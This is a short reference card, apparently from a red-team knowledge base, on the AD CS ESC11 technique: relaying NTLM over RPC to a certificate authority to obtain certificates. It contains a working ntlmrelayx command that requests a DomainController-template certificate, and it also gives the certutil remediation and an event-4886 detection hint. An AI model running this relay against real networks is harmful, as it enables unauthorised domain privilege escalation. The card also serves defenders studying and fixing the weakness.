---
id: adcs_esc11
type: technique
label: "AD CS ESC11 (RPC enrollment relay exposure)"
phase: "privesc"
tools: ["certipy"]
cve: null
detect: "Review RPC enrollment privacy enforcement and correlate NTLM authentication, RPC enrollment traffic and CA issuance."
mitre: "T1649"
tag: null
---


# AD CS ESC11 (RPC enrollment relay exposure)

### Affected object / attribute
**CA RPC interface (ICertPassage)** — lack of packet integrity/privacy enforcement.

### Concept (deep)
The CA RPC interface does **not enforce packet integrity**. Relay NTLM over **RPC** to request certificates — effective where HTTP enrolment is disabled but RPC enrolment is exposed.

### Commands
```bash
# ── Relay over RPC ───────────────────────────────────────────────────
ntlmrelayx.py -t rpc://10.10.10.20 -rpc-mode ICPR \
  -smb2support --adcs --template DomainController

# ── Fix: enforce encrypted RPC ───────────────────────────────────────
certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
# Restart CertSvc.
```

### Detection
NTLM on CA RPC (TCP 135 → high port); **4886** issued to a non-requester.

---
